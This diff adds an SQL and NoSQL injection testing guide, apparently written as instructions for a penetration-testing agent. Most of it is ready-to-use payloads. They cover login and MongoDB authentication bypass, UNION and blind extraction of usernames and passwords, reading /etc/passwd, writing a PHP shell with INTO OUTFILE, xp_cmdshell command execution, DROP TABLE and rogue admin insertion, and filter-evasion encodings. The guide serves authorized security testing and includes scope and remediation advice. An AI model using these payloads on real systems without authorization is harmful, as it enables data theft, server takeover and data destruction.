@@ -1,0 +1,264 @@
+<sql_injection_testing_guide>
+<title>SQL INJECTION VULNERABILITY TESTING</title>
+
+<critical>SQL injection remains one of the most critical vulnerabilities due to dynamic query construction, ORM misuse, and insufficient input validation. Test systematically across query contexts, database engines, and application layers.</critical>
+
+<scope>
+- Classic SQL injection (in-band error-based and UNION-based)
+- Blind SQL injection (boolean-based and time-based)
+- Out-of-band SQL injection (DNS, HTTP callbacks)
+- Second-order SQL injection (stored and later executed)
+- NoSQL injection variants (MongoDB, CouchDB, etc.)
+- ORM injection (SQLAlchemy, Django ORM, TypeORM)
+</scope>
+
+<methodology>
+1. **Identify injection points**: Query parameters, POST data, headers (User-Agent, Referer), cookies, JSON fields, XML attributes
+2. **Test basic detection**: Single quotes, double quotes, backticks, logical operators, SQL comments
+3. **Fingerprint database**: Error messages, timing behavior, version-specific functions
+4. **Determine injection type**: Error-based, UNION-based, boolean blind, time blind
+5. **Extract data**: Database structure, table names, column names, sensitive data
+6. **Validate impact**: Demonstrate actual data access with proof-of-concept
+</methodology>
+
+<detection_payloads>
+# Basic quote detection
+'
+"
+`
+')
+")
+`)
+
+# Logical operators
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+') OR ('1'='1
+" OR 1=1#
+' OR 'x'='x
+
+# SQL comments (terminate query)
+'--
+'#
+'/*
+*/
+
+# Boolean tests
+' AND 1=1--  (should return normal response)
+' AND 1=2--  (should return different response)
+
+# Time-based detection
+'; WAITFOR DELAY '0:0:5'--     (MSSQL)
+' AND SLEEP(5)--                (MySQL)
+' AND pg_sleep(5)--             (PostgreSQL)
+'||pg_sleep(5)--                (PostgreSQL alternative)
+</detection_payloads>
+
+<database_fingerprinting>
+# MySQL
+VERSION()
+DATABASE()
+USER()
+@@version
+@@datadir
+
+# PostgreSQL
+version()
+current_database()
+current_user
+inet_server_addr()
+
+# Microsoft SQL Server
+@@VERSION
+DB_NAME()
+USER_NAME()
+SYSTEM_USER
+@@SERVERNAME
+
+# Oracle
+SELECT banner FROM v$version
+SELECT user FROM dual
+SELECT * FROM all_users
+SELECT * FROM all_tables
+
+# SQLite
+sqlite_version()
+sqlite_source_id()
+</database_fingerprinting>
+
+<union_based_exploitation>
+# Determine number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+... (continue until error)
+
+# Find injectable columns
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+# Extract data (MySQL example)
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT NULL,username,password FROM users--
+
+# Extract data (PostgreSQL example)
+' UNION SELECT NULL,tablename,NULL FROM pg_tables--
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+# Extract data (MSSQL example)
+' UNION SELECT NULL,name,NULL FROM sys.tables--
+' UNION SELECT NULL,name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--
+</union_based_exploitation>
+
+<blind_exploitation>
+# Boolean-based (character-by-character extraction)
+' AND SUBSTRING((SELECT database()),1,1)='a'--
+' AND SUBSTRING((SELECT database()),1,1)='b'--
+... (iterate through alphabet)
+
+# Time-based (when no visible output differences)
+' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--
+' AND CASE WHEN (SELECT COUNT(*) FROM users)>10 THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+# Boolean-based table enumeration
+' AND EXISTS(SELECT 1 FROM users)--
+' AND EXISTS(SELECT 1 FROM admin)--
+' AND EXISTS(SELECT 1 FROM credentials)--
+</blind_exploitation>
+
+<second_order_injection>
+# Inject payload in one location (e.g., user profile)
+Username: admin'--
+Email: test@example.com
+
+# Payload executes when data is retrieved and used in another query
+# Example: Admin panel displaying username without proper escaping
+# Result: Query terminates early due to injected comment
+</second_order_injection>
+
+<nosql_injection>
+# MongoDB authentication bypass
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": "admin", "password": {"$regex": ".*"}}
+
+# MongoDB data extraction
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^b"}}
+... (iterate to extract password)
+</nosql_injection>
+
+<orm_specific_attacks>
+# Django ORM raw queries
+Model.objects.raw("SELECT * FROM app_model WHERE id=" + user_input)
+
+# SQLAlchemy text() without parameters
+session.execute(text(f"SELECT * FROM users WHERE id={user_id}"))
+
+# Active Record (Ruby on Rails)
+User.where("name = '#{params[:name]}'")
+
+# Test with: ' OR '1'='1
+</orm_specific_attacks>
+
+<exploitation_techniques>
+# Bypassing login
+username: admin'--
+password: anything
+
+username: admin'#
+password: anything
+
+username: admin' OR '1'='1
+password: admin' OR '1'='1
+
+# Extracting database version
+' UNION SELECT @@version,NULL,NULL--
+
+# Reading files (MySQL with FILE privilege)
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
+
+# Writing files (MySQL with FILE privilege)
+' UNION SELECT 'shell code',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
+
+# Command execution (MSSQL with xp_cmdshell)
+'; EXEC xp_cmdshell 'whoami'--
+
+# Stacked queries (when multiple statements allowed)
+'; DROP TABLE users--
+'; INSERT INTO admins VALUES ('hacker','password')--
+</exploitation_techniques>
+
+<bypassing_filters>
+# Whitespace bypass
+'/**/OR/**/1=1--
+'+OR+1=1--
+'%09OR%091=1--
+
+# Case variation
+' Or 1=1--
+' oR 1=1--
+' UnIoN SeLeCt--
+
+# Encoding
+%27%20OR%201=1--        (URL encoding)
+&#39; OR 1=1--          (HTML entities)
+\x27 OR 1=1--           (Hex encoding)
+
+# Comment bypass
+'||'1'='1
+'||1--
+'OR''='
+
+# Alternative operators
+' OR 'x'='x
+' AND 'a' LIKE 'a
+' OR 1 BETWEEN 0 AND 2--
+</bypassing_filters>
+
+<validation_requirements>
+Provide complete proof-of-concept including:
+1. **Exact injection point**: URL, parameter name, request body location
+2. **Payload used**: Full payload string that triggered vulnerability
+3. **Database fingerprint**: Type (MySQL/PostgreSQL/MSSQL/etc.) and version
+4. **Injection type**: Error-based, UNION-based, boolean blind, time blind
+5. **Data extracted**: Sample of actual data retrieved (1-2 rows max for proof)
+6. **Impact assessment**: What data is accessible, privilege level of DB user
+7. **Reproduction steps**: Exact curl command or HTTP request demonstrating exploit
+8. **Remediation**: Specific fix (parameterized queries, ORM usage, input validation)
+</validation_requirements>
+
+<false_positives_to_avoid>
+- Error messages that are generic application errors, not SQL errors
+- Timing variations due to network latency or server load
+- Quote characters properly escaped or sanitized
+- ORM/prepared statements that correctly parameterize inputs
+- Input validation that strictly enforces expected format
+- WAF blocks that prevent payloads from reaching database
+</false_positives_to_avoid>
+
+<pro_tips>
+1. **Start with safe detection**: Use quote characters and logical operators before attempting data extraction
+2. **Automate carefully**: Use sqlmap for initial detection, manual testing for validation and impact assessment
+3. **Test all input vectors**: Don't just test URL parameters—test headers, cookies, JSON, XML
+4. **Look for second-order**: Stored data might be vulnerable when retrieved
+5. **Check multiple endpoints**: Same vulnerability might exist across multiple features
+6. **Time-based needs baseline**: Measure normal response time before claiming time-based SQLi
+7. **Combine techniques**: Boolean-based for structure, UNION for data extraction
+8. **Document everything**: Exact payloads, responses, and reproduction steps
+9. **Respect scope**: Only access data necessary to prove vulnerability exists
+10. **Verify with safe queries**: SELECT version() is better than DROP TABLE for proof
+</pro_tips>
+
+<remember>
+SQL injection can lead to complete database compromise. Always:
+- Provide minimal, safe proof (version info or row count)
+- Never delete or modify production data
+- Document exact reproduction steps
+- Recommend parameterized queries/prepared statements as primary fix
+- Test remediation after implementation
+</remember>
+</sql_injection_testing_guide>
